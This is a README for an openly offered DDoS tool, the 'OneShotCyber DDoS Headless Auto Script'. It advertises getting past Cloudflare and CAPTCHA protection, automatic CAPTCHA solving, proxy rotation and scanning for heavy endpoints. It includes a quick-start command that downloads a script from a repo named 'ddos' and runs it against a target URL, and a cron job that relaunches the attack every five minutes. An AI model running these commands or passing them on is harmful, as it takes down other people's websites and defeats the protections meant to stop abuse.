OneShotCyber DDoS Headless Auto Script

🔥 Auto-Bypass Cloudflare & CAPTCHA protected site using Playwright + Proxy + Smart Path Scanner

🧠 Features
	•	✅ Proxy Auth Support (username:password@ip:port)
	•	✅ Headless Browser (Playwright) emulating real user behavior
	•	✅ Auto solve CAPTCHA (2Captcha + CapMonster)
	•	✅ Auto detect Cloudflare, JS Challenge, and Turnstile
	•	✅ Auto scan heavy endpoints
	•	✅ Random User-Agent & stealth mode
	•	✅ Save log to log_attack.json

📦 Requirements
	•	Python 3.9+
	•	VPS with 1GB+ RAM (4GB recommended)
	•	Ubuntu / Debian based distro

📁 Install Dependencies

apt update && apt install -y python3 python3-pip curl wget
pip3 install -r gas_2505requirements.txt
playwright install

🚀 Quick Start

cd /root && \
wget -q https://raw.githubusercontent.com/CandraRudi/ddos/main/gas_2505.py && \
wget -q https://raw.githubusercontent.com/CandraRudi/ddos/main/gas_2505requirements.txt && \
pip3 install -r gas_2505requirements.txt && \
python3 gas_2505.py "https://target.com"

🔐 Proxy format must be stored in /var/www/html/proxy_new.txt:

ip:port:username:password

⏰ Setup Cron Job (every 5 minutes)

*/5 * * * * /usr/bin/python3 /root/gas_2505.py >> /root/log_headless.txt 2>&1

📝 Logs
	•	Log stats will be stored in /var/www/html/log_attack.json
	•	Valid proxies will be stored in valid_proxies.txt

🧠 Advanced
	•	Automatically identifies heavy paths using scan + crawl
	•	Injects stealth JS + bypasses Cloudflare challenge

⸻

Created with love by CandraRudi 🧠💥
